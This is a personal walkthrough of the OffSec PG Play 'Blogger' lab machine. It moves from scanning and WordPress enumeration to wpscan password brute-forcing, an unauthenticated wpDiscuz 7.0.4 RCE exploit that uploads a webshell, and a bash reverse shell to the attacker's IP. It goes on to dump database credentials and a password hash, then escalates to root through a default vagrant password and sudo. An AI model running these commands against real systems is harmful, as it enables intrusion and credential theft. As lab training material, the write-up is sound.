---
title: "Blogger"
kind: writeup
tags:
  - offsec-pg-play
  - status/done
  - writeup
  - linux
  - web
status: "Done"
difficulty: "Medium"
date: 2026-06-22
category:
  - "Linux"
  - "Web"
database: "Offsec PG Play"
area: "Offsec PG Play"
up: "[[Offsec PG Play]]"
notion-id: 387759b9275180e2bd15cacb06b5d411
---

# Blogger

In: [[Career]] / [[Offsec PG Play]]

## Nmap Scan

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -p- -T4 -Pn -sV -oA ~/nmap/nmap_full_scan 192.168.138.217
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-22 01:27 -0400
Stats: 0:00:44 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 64.08% done; ETC: 01:28 (0:00:24 remaining)
Nmap scan report for 192.168.138.217
Host is up (0.083s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.73 seconds

```

![[attachments/Offsec PG Play/Blogger/image.png]]

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ ffuf  -u "http://192.168.138.217/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r      

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.138.217/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 85ms]
.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 85ms]
assets                  [Status: 200, Size: 1504, Words: 100, Lines: 20, Duration: 90ms]
css                     [Status: 200, Size: 2366, Words: 128, Lines: 24, Duration: 86ms]
images                  [Status: 200, Size: 4668, Words: 244, Lines: 36, Duration: 82ms]
js                      [Status: 200, Size: 2627, Words: 162, Lines: 25, Duration: 84ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 106ms]
:: Progress: [20481/20481] :: Job [1/1] :: 451 req/sec :: Duration: [0:00:46] :: Errors: 0 ::

```

![[attachments/Offsec PG Play/Blogger/image 1.png]]

![[attachments/Offsec PG Play/Blogger/image 2.png]]

```bash
┌──(kali㉿kali)-[~]
└─$ sudo wpscan --url http://blogger.pg/assets/fonts/blog/ --enumerate --api-token sNBJsnc2OeTuZlSHM3HalpRF7Da9Wq0GBYDC9RPqosQ
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://blogger.pg/assets/fonts/blog/ [192.168.138.217]
[+] Started: Mon Jun 22 01:48:12 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blogger.pg/assets/fonts/blog/xmlrpc.php
 | Found By: Link Tag (Passive Detection)
 | Confidence: 100%
 | Confirmed By: Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blogger.pg/assets/fonts/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blogger.pg/assets/fonts/blog/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blogger.pg/assets/fonts/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:12 <============================================================================================================================================================> (652 / 652) 100.00% Time: 00:00:12
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:47 <==========================================================================================================================================================> (2575 / 2575) 100.00% Time: 00:00:47

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:02 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:01 <===================================================================================================================================================================> (84 / 84) 100.00% Time: 00:00:01

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:02 <========================================================================================================================================================> (100 / 100) 100.00% Time: 00:00:02

[i] Medias(s) Identified:

[+] http://blogger.pg/assets/fonts/blog/?attachment_id=33
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] j@m3s
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] jm3s
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 22

[+] Finished: Mon Jun 22 01:49:33 2026
[+] Requests Done: 3626
[+] Cached Requests: 10
[+] Data Sent: 1.074 MB
[+] Data Received: 24.527 MB
[+] Memory used: 293.727 MB
[+] Elapsed time: 00:01:21

```

tried enum vhosts - got nothing

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://blogger.pg/assets/fonts/blog/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://blogger.pg/assets/fonts/blog/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 1243ms]
.htaccess               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 2610ms]
wp-admin                [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 82ms]
wp-content              [Status: 301, Size: 331, Words: 20, Lines: 10, Duration: 86ms]
wp-includes             [Status: 301, Size: 332, Words: 20, Lines: 10, Duration: 75ms]
:: Progress: [20481/20481] :: Job [1/1] :: 455 req/sec :: Duration: [0:00:43] :: Errors: 0 ::
                                                                                                 
```

ran cmseek

```bash
 ___ _  _ ____ ____ ____ _  _
|    |\/| [__  |___ |___ |_/  by @r3dhax0r
|___ |  | ___| |___ |___ | \_ Version 1.1.3 K-RONA

 [+]  Deep Scan Results  [+] 

 ┏━Target: blogger.pg
 ┃
 ┠── CMS: WordPress
 ┃    │
 ┃    ├── Version: 4.9.8
 ┃    ╰── URL: https://wordpress.org
 ┃
 ┠──[WordPress Deepscan]
 ┃    │
 ┃    ├── Readme file found: http://blogger.pg/assets/fonts/blog//readme.html
 ┃    ├── License file: http://blogger.pg/assets/fonts/blog//license.txt
 ┃    │
 ┃    ├── Themes Enumerated: 1
 ┃    │    │
 ┃    │    ╰── Theme: poseidon
 ┃    │        │
 ┃    │        ├── Version: 20180413
 ┃    │        ╰── URL: http://blogger.pg/assets/fonts/blog//wp-content/themes/poseidon
 ┃    │
 ┃
 ┠── Result: /home/kali/Result/blogger.pg_assets_fonts_blog/cms.json
 ┃
 ┗━Scan Completed in 23.24 Seconds, using 45 Requests

 CMSeeK says ~ sayonara

```

tried the posiedon exploit, but didnt worked

https://www.exploit-db.com/exploits/29701

also tried bruteforcing the user to the wpadmin

```bash
sudo wpscan -U users.list -P /usr/share/wordlists/rockyou.txt --url http://blogger.pg/assets/fonts/blog/ 

sudo wpscan --password-attack xmlrpc -t 20 -U users.list -P /usr/share/wordlists/rockyou.txt --url http://blogger.pg/assets/fonts/blog/ 
```

tried hacktricks

![[attachments/Offsec PG Play/Blogger/image 3.png]]

![[attachments/Offsec PG Play/Blogger/image 4.png]]

```bash
──(kali㉿kali)-[~]
└─$ sudo wpscan --url http://192.168.138.217/assets/fonts/blog --plugins-detection aggressive
[sudo] password for kali: 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.138.217/assets/fonts/blog/ [192.168.138.217]
[+] Started: Mon Jun 22 02:46:56 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.138.217/assets/fonts/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.138.217/assets/fonts/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.138.217/assets/fonts/blog/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.138.217/assets/fonts/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.9.8 identified (Insecure, released on 2018-08-02).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.138.217/assets/fonts/blog/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.8'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.138.217/assets/fonts/blog/, Match: 'WordPress 4.9.8'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:14:40 <============================================                                                             > (51742 / 123167) 42.00%  ETA: 00:20:16
 Checking Known Locations - Time: 00:29:33 <=========================================================================================               > (106473 / 123167) 86.44%  ETA: 00:04:38
 Checking Known Locations - Time: 00:34:02 <=======================================================================================================> (123167 / 123167) 100.00% Time: 00:34:02
[+] Checking Plugin Versions (via Passive and Aggressive Methods)                                                                                                                            
                                                                                                                                                                                             
[i] Plugin(s) Identified:                                                                                                                                                                    
                                                                                                                                                                                             
[+] akismet                                                                                                                                                                                  
 | Location: http://192.168.138.217/assets/fonts/blog/wp-content/plugins/akismet/
 | Last Updated: 2026-04-23T22:34:00.000Z
 | Readme: http://192.168.138.217/assets/fonts/blog/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.7
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.138.217/assets/fonts/blog/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.0.8 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.138.217/assets/fonts/blog/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.138.217/assets/fonts/blog/wp-content/plugins/akismet/readme.txt

[+] wpdiscuz
 | Location: http://192.168.138.217/assets/fonts/blog/wp-content/plugins/wpdiscuz/
 | Last Updated: 2026-06-10T11:16:00.000Z
 | Readme: http://192.168.138.217/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt
 | [!] The version is out of date, the latest version is 7.6.58
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.138.217/assets/fonts/blog/wp-content/plugins/wpdiscuz/, status: 200
 |
 | Version: 7.0.4 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.138.217/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:02 <==============================================================================================================> (137 / 137) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Jun 22 03:21:21 2026
[+] Requests Done: 123341
[+] Cached Requests: 6
[+] Data Sent: 31.97 MB
[+] Data Received: 16.633 MB
[+] Memory used: 453.152 MB
[+] Elapsed time: 00:34:25

```

![[attachments/Offsec PG Play/Blogger/image 5.png]]

```bash
┌──(kali㉿kali)-[~/CVEs]
└─$ git clone https://github.com/carlosalbertotuma/wpDiscuz-7.0.4-PoC-RCE.git
Cloning into 'wpDiscuz-7.0.4-PoC-RCE'...
remote: Enumerating objects: 37, done.
remote: Counting objects: 100% (37/37), done.
remote: Compressing objects: 100% (35/35), done.
remote: Total 37 (delta 8), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (37/37), 5.11 MiB | 10.88 MiB/s, done.
Resolving deltas: 100% (8/8), done.
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/CVEs]
└─$ ls
admin@10.129.229.66  CVE-2020-1938  CVE-2023-0386  CVE-2025-57819-poc  wpDiscuz-7.0.4-PoC-RCE
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/CVEs]
└─$ cd wpDiscuz-7.0.4-PoC-RCE 
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/CVEs/wpDiscuz-7.0.4-PoC-RCE]
└─$ ls
docker-compose.yml  dockerfile  README.md  wpdiscuz.7.0.4.zip  wpdiscuz_rce.py
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/CVEs/wpDiscuz-7.0.4-PoC-RCE]
└─$ python3 wpdiscuz_rce.py -u http://blogger.pg/assets/fonts/blog/ -p "/?p=1" --cmd "id"
============================================================
[*] wpDiscuz 7.0.4 – Unauthenticated RCE
[*] CVE-2020-24186
[*] Exploit Autor: Carlos Tuma - Bl4dsc4n
[*] Docker / Linux exploit
============================================================
[+] wmuSecurity: 65b24b7eb3
[+] wc_post_id: 1
[+] Shell uploaded: http://blogger.pg/assets/fonts/blog/wp-content/uploads/2026/06/jcqwshhdew-1782113024.8162.php
GIF89a;
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

```bash
┌──(kali㉿kali)-[~/CVEs/wpDiscuz-7.0.4-PoC-RCE]
└─$ python3 wpdiscuz_rce.py -u http://blogger.pg/assets/fonts/blog/ -p "/?p=1" --cmd "bash -c 'bash -i >& /dev/tcp/192.168.45.207/9001 0>&1'"
============================================================
[*] wpDiscuz 7.0.4 – Unauthenticated RCE
[*] CVE-2020-24186
[*] Exploit Autor: Carlos Tuma - Bl4dsc4n
[*] Docker / Linux exploit
============================================================
[+] wmuSecurity: 65b24b7eb3
[+] wc_post_id: 1
[+] Shell uploaded: http://blogger.pg/assets/fonts/blog/wp-content/uploads/2026/06/fyxquqfiwv-1782113333.9954.php

```

```bash
┌──(kali㉿kali)-[~/CVEs/wpDiscuz-7.0.4-PoC-RCE]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.138.217] 55640
bash: cannot set terminal process group (1364): Inappropriate ioctl for device
bash: no job control in this shell
<ress/assets/fonts/blog/wp-content/uploads/2026/06$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<content/uploads/2026/06$ python3 -c 'import pty; pty.spawn("/bin/bash")'    
<ress/assets/fonts/blog/wp-content/uploads/2026/06$ clear
clear
TERM environment variable not set.
<ress/assets/fonts/blog/wp-content/uploads/2026/06$ export TERM=xterm  
export TERM=xterm
026/06$ @ubuntu-xenial:/var/www/wordpress/assets/fonts/blog/wp-content/uploads/20

026/06$ exitntu-xenial:/var/www/wordpress/assets/fonts/blog/wp-content/uploads/20
exit
exit
<ress/assets/fonts/blog/wp-content/uploads/2026/06$ ls
ls
fyxquqfiwv-1782113333.9954.php
gdnmuotdxv-1782113185.5895.php
jcqwshhdew-1782113024.8162.php
oktvtiyfge-1782113273.879.php
<ress/assets/fonts/blog/wp-content/uploads/2026/06$ cd
cd
bash: cd: HOME not set
<ress/assets/fonts/blog/wp-content/uploads/2026/06$ cd /home
cd /home
www-data@ubuntu-xenial:/home$ ls
ls
james
ubuntu
vagrant
www-data@ubuntu-xenial:/home$ cd james  
cd james
www-data@ubuntu-xenial:/home/james$ ls
ls
local.txt
www-data@ubuntu-xenial:/home/james$ cat local.txt
cat local.txt
92797aa9a7d045a382f0407e4ab14eba
www-data@ubuntu-xenial:/home/james$ 
stty rows 31 cols 121
```

wp-config.php

```bash
www-data@ubuntu-xenial:/var/www/wordpress/assets/fonts/blog$ cat wp-config.php 
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'sup3r_s3cr3t');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

cat wp-config.php ial:/var/www/wordpress/assets/fonts/blog$ www-data@ubuntu-xenial:/var/www/wordpress/assets/fonts/blog$ 
bash: www-data@ubuntu-xenial:/var/www/wordpress/assets/fonts/blog$: No such file or directory
www-data@ubuntu-xenial:/var/www/wordpress/assets/fonts/blog$ <?php
bash: ?php: No such file or directory
www-data@ubuntu-xenial:/var/www/wordpress/assets/fonts/blog$ /**
bash: /bin: Is a directory
www-data@ubuntu-xenial:/var/www/wordpress/assets/fonts/blog$  * The base configuration for WordPress
index.php: command not found
www-data@ubuntu-xenial:/var/www/wordpress/assets/fonts/blog$  *
index.php: command not found
hew-data@ubuntu-xenial:/var/www/wordpress/assets/fonts/blog$  * The wp-config.php creation script uses this file during t 
www-data@ubuntu-xenial:/var/www/wordpress/assets/fonts/blog$  * installation. You don't have to use the web site, you can
>  * copy this file to "wp-config.php" and fill in the values.* installation. You don't have to use the web site, you can 
>  *
>  * This file contains the following configurations:
>  *
>  * * MySQL settings
>  * * Secret keys
>  * * Database table prefix
>  * * ABSPATH
>  *
>  * @link https://codex.wordpress.org/Editing_wp-config.php
>  *
>  * @package WordPress
>  */
> 
> // ** MySQL settings - You can get this info from your web host ** //
> /** The name of the database for WordPress */
> define('DB_NAME', 'wordpress');
> 

```

```bash
ww-data@ubuntu-xenial:/var/www/wordpress/assets/fonts/blog$ mysql -u root -p 
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 13
Server version: 10.0.38-MariaDB-0ubuntu0.16.04.1 Ubuntu 16.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress          |
+--------------------+
4 rows in set (0.00 sec)

MariaDB [(none)]> use wordpress
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [wordpress]> show tables;
+-----------------------------+
| Tables_in_wordpress         |
+-----------------------------+
| wp_commentmeta              |
| wp_comments                 |
| wp_links                    |
| wp_options                  |
| wp_postmeta                 |
| wp_posts                    |
| wp_term_relationships       |
| wp_term_taxonomy            |
| wp_termmeta                 |
| wp_terms                    |
| wp_usermeta                 |
| wp_users                    |
| wp_wc_avatars_cache         |
| wp_wc_comments_subscription |
| wp_wc_feedback_forms        |
| wp_wc_follow_users          |
| wp_wc_phrases               |
| wp_wc_users_rated           |
| wp_wc_users_voted           |
+-----------------------------+
19 rows in set (0.00 sec)

MariaDB [wordpress]> select * from wp_users
    -> ;
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | j@m3s      | $P$BqG2S/yf1TNEu03lHunJLawBEzKQZv/ | jm3s          | admin@blogger.thm |          | 2021-01-17 12:40:06 |                     |           0 | j@m3s        |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
1 row in set (0.00 sec)

MariaDB [wordpress]> Ctrl-C -- exit!
Aborted
www-data@ubuntu-xenial:/var/www/wordpress/assets/fonts/blog$ 

```

```bash
www-data@ubuntu-xenial:/home/ubuntu$ cd ..
www-data@ubuntu-xenial:/home$ ls -la
total 20
drwxr-xr-x  5 root    root    4096 Jan 17  2021 .
drwxr-xr-x 25 root    root    4096 Aug  2  2024 ..
drwxr-xr-x  2 james   james   4096 Aug  8  2022 james
drwxr-xr-x  3 ubuntu  ubuntu  4096 Jan 17  2021 ubuntu
drwxr-xr-x  4 vagrant vagrant 4096 Jan 17  2021 vagrant
www-data@ubuntu-xenial:/home$ su jams
No passwd entry for user 'jams'
www-data@ubuntu-xenial:/home$ su james
Password: 
su: Authentication failure
www-data@ubuntu-xenial:/home$ su ubuntu
Password: 
su: Authentication failure
www-data@ubuntu-xenial:/home$ su root
Password: 
su: Authentication failure
www-data@ubuntu-xenial:/home$ su james
Password: 
su: Authentication failure
www-data@ubuntu-xenial:/home$ su ubuntu
Password: 
su: Authentication failure
www-data@ubuntu-xenial:/home$ su vagrant
Password: vagrant
vagrant@ubuntu-xenial:/home$ 

```

```bash
vagrant@ubuntu-xenial:~$ cd
vagrant@ubuntu-xenial:~$ id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)
vagrant@ubuntu-xenial:~$ uname -r
4.4.0-210-generic
vagrant@ubuntu-xenial:~$ sudo -l
Matching Defaults entries for vagrant on ubuntu-xenial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vagrant may run the following commands on ubuntu-xenial:
    (ALL) NOPASSWD: ALL
vagrant@ubuntu-xenial:~$ sudo su
root@ubuntu-xenial:/home/vagrant# cat /root/proof.txt
4d81994439169a12080c11f827579349
root@ubuntu-xenial:/home/vagrant# 

```
